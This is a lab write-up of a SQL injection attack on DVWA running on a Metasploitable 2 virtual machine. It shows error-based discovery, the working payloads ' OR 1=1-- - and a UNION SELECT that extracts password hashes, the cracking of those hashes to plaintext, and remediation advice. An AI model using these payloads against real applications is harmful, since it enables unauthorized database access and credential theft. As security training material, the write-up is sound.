# Writeup 02 — SQL Injection (DVWA)

**Target:** Metasploitable 2 — DVWA (Damn Vulnerable Web Application)  
**IP:** 192.168.100.5  
**URL:** http://192.168.100.5/dvwa/vulnerabilities/sqli/  
**Security Level:** Low  
**Date:** July 2026  
**Author:** Rúben Silva  

---

## Objective

Demonstrate a complete SQL Injection attack chain on the DVWA SQL Injection module, from vulnerability discovery through to plaintext password recovery.

---

## Tools Used

| Tool | Purpose |
|---|---|
| Firefox (Kali Linux) | Manual payload injection |
| CrackStation (crackstation.net) | MD5 hash cracking |
| Nmap | Prior service enumeration |

---

## 1. Reconnaissance

Prior Nmap scan (`nmap -sV 192.168.100.5`) identified port **80/tcp** running **Apache HTTP** on the Metasploitable 2 target. Navigating to `http://192.168.100.5` revealed the Metasploitable web interface, which includes DVWA.

DVWA was accessed at `http://192.168.100.5/dvwa` with default credentials (`admin:password`). Security level was set to **Low** before beginning.

---

## 2. Vulnerability Discovery

### 2.1 Normal Application Behavior

Entering a valid User ID (`1`) returned the expected output:

```
ID: 1
First name: admin
Surname: admin
```

The application queries a MySQL database and returns user records based on the supplied ID. The underlying query is likely:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '[INPUT]';
```

### 2.2 Confirming SQL Injection

Entering a single quote (`'`) in the User ID field produced a MySQL error message visible to the user:

```
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**Finding:** The application passes user input directly to the database query without sanitization or parameterization. The error message also confirms:
- The backend database is **MySQL**
- Error messages are not suppressed — **error-based information disclosure** is present

---

## 3. Exploitation

### 3.1 Authentication Bypass — Extract All Users

**Payload:**
```
' OR 1=1-- -
```

**Result:** The query returned all user records from the database:

```
ID: ' OR 1=1-- -  |  First name: admin      |  Surname: admin
ID: ' OR 1=1-- -  |  First name: Gordon     |  Surname: Brown
ID: ' OR 1=1-- -  |  First name: Hack       |  Surname: Me
ID: ' OR 1=1-- -  |  First name: Pablo      |  Surname: Picasso
ID: ' OR 1=1-- -  |  First name: Bob        |  Surname: Smith
```

**Explanation:** The payload closes the original query string with `'`, then injects `OR 1=1` which is always true, causing the WHERE clause to match all records. The `-- -` comments out the remainder of the original query.

The injected query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1-- -';
```

### 3.2 UNION-Based Attack — Extract Password Hashes

**Payload:**
```
' UNION SELECT user, password FROM users-- -
```

**Result:** The UNION SELECT appended a second query to the original, extracting usernames and password hashes from the `users` table:

```
First name: admin    |  Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb  |  Surname: e99a18c428cb38d5f260853678922e03
First name: 1337     |  Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo    |  Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy   |  Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Explanation:** UNION SELECT allows appending a second SELECT statement to the original query. Since the original query returns two columns (first_name, last_name), the injected query must also return two columns — hence `SELECT user, password`.

---

## 4. Post-Exploitation — Hash Cracking

The extracted hashes were identified as **MD5** and submitted to CrackStation for offline lookup table cracking.

**Results — all hashes cracked successfully:**

| Username | MD5 Hash | Plaintext Password |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | **password** |
| gordonb | `e99a18c428cb38d5f260853678922e03` | **abc123** |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | **charley** |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | **letmein** |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | **password** |

All passwords were found in common wordlists, confirming weak password policy in addition to the SQL Injection vulnerability.

---

## 5. Attack Chain Summary

```
[1] Normal input test (ID: 1) → confirms application behavior
        ↓
[2] Single quote (') → SQL syntax error → confirms unsanitized input
        ↓
[3] ' OR 1=1-- - → authentication bypass → all users exposed
        ↓
[4] ' UNION SELECT user, password FROM users-- - → password hashes extracted
        ↓
[5] CrackStation → MD5 hashes cracked → plaintext passwords recovered
        ↓
[RESULT] Full database compromise — credentials for all 5 users obtained
```

---

## 6. Severity Assessment

| # | Finding | Severity | CVSS Category |
|---|---|---|---|
| F1 | SQL Injection — unsanitized user input | 🔴 Critical | Injection |
| F2 | Error-based information disclosure | 🟠 Medium | Information Exposure |
| F3 | Weak password hashing (MD5, unsalted) | 🔴 Critical | Cryptographic Failure |
| F4 | Weak passwords across all accounts | 🟠 Medium | Authentication |

---

## 7. Recommendations

**R1 — Use parameterized queries (prepared statements):**
```php
// Vulnerable (current)
$query = "SELECT * FROM users WHERE id = '$id'";

// Secure (recommended)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**R2 — Suppress database error messages in production:**
Configure PHP/MySQL to log errors internally rather than displaying them to users. Error messages expose database structure and technology stack.

**R3 — Replace MD5 with a secure hashing algorithm:**
MD5 is cryptographically broken and unsuitable for password storage. Use `bcrypt`, `Argon2id`, or `scrypt` with appropriate work factors and unique salts per user.

**R4 — Enforce a strong password policy:**
All discovered passwords (`password`, `abc123`, `letmein`, `charley`) appear in the top 100 most common passwords. Implement minimum complexity requirements and check new passwords against known breach databases (e.g. HaveIBeenPwned API).

**R5 — Implement input validation:**
Validate and whitelist all user input on the server side. For numeric ID fields, reject any non-integer input before it reaches the database layer.

---

## 8. Tools & References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CrackStation](https://crackstation.net) — Hash lookup
- [DVWA GitHub](https://github.com/digininja/DVWA)

---

> **Legal disclaimer:** This exercise was performed exclusively on an intentionally vulnerable application (DVWA) running on an isolated virtual machine (Metasploitable 2) within a private lab network. No real systems were accessed or harmed.
